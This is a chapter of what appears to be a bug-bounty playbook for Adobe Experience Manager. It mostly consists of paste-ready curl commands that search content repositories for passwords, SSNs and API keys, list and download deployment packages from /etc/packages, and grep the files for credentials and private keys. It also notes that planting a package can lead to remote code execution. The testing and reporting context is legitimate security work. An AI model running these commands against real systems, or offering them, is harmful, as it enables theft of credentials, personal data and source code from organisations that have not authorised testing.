# 7 — Content mining & packages (where money hides)

**Goal:** Find secrets in content and deployment zips — without needing RCE.

---

## Signal

You can read **any** of:

- `/content...json` dumps  
- QueryBuilder hits  
- Direct file downloads under DAM  
- `/etc/packages` listings  

---

## Why

1. **Authors treat AEM like a file share.**  
   Spreadsheets with SSNs, “do not publish” PDFs, password docs land under `/content` or DAM.

2. **Every deploy can leave a zip under `/etc/packages`.**  
   That zip is often **customer source + configs**.  
   Jim Green: source + MySQL password + Akamai API keys in one package heist.

3. **`crx-quickstart/install/`** (server-side, if you ever get file write)  
   Drop a package zip → AEM may install on restart → RCE path for red teams with write.

---

## Paste kit — map sensitive-looking content

```bash
T="https://TARGET"
QB="$T/bin/querybuilder.json"   # or your bypass URL

# Fulltext hunts (adjust to program language)
for term in password secret confidential internal credential api_key aws jdbc token ssn salary; do
  echo "===== $term ====="
  curl -sk -G "$QB" \
    --data-urlencode "path=/content" \
    --data-urlencode "fulltext=$term" \
    --data-urlencode "p.limit=10" | head -c 400
  echo
done
```

```bash
# DAM assets named like backups / exports
curl -sk -G "$QB" \
  --data-urlencode "path=/content/dam" \
  --data-urlencode "type=dam:Asset" \
  --data-urlencode "nodename=*backup*" \
  --data-urlencode "p.limit=20"
```

---

## Paste kit — packages

```bash
T="https://TARGET"

# JSON list
curl -sk "$T/etc/packages.1.json" | head -c 2000; echo
curl -sk "$T/etc/packages.2.json" -o packages.json

# QueryBuilder
curl -sk -G "$QB" \
  --data-urlencode "path=/etc/packages" \
  --data-urlencode "p.limit=100" -o packages-qb.json
```

Download candidates (path from JSON):

```bash
# Example shape — fix to real path from listing
curl -sk -O "$T/etc/packages/my_packages/customer-all-1.0.zip"
# or
curl -sk -O "$T/etc/packages/day/cq560/product/something.zip"
```

Offline triage:

```bash
mkdir -p /tmp/aem-pkg && cd /tmp/aem-pkg
unzip -l customer-all-1.0.zip | head
unzip customer-all-1.0.zip
grep -RniE 'password|secret|api[_-]?key|jdbc:|AKIA|BEGIN RSA|private_key' . | head -50
```

---

## Paste kit — anonymous write probes (careful)

Only if program allows write testing.

```bash
# Classic misconfig area mentioned in research (Forms-related write spots, etc.)
# Try creating a node only in explicitly allowed test paths if any

# Example pattern from older research (often locked now):
# POST to a path with :name / jcr:primaryType — if 200/201, note it
```

If you find **pre-auth write**, stop and re-read scope — that’s high impact (node plant → XSS/EL chains in modern research).

---

## What to screenshot for reports

- URL that lists package  
- Unzipped file path with secret (redact in public writeups)  
- Proof of access level (anonymous vs auth)

---

## Variations

| Time | Focus |
|------|--------|
| 10 min | `fulltext=password` + `/etc/packages.1.json` |
| 30 min | Download top 3 zips, grep secrets |
| Finance targets | Pre-release PDFs / “earnings” / “internal” under DAM |

---

## Done when

- [ ] Content search done on `/content` + DAM  
- [ ] Packages listed or proven blocked  
- [ ] Any secret handled as sensitive loot  

**Next:** [08-aem-forms.md](./08-aem-forms.md) if Forms present, else [09-modern-bugs.md](./09-modern-bugs.md)
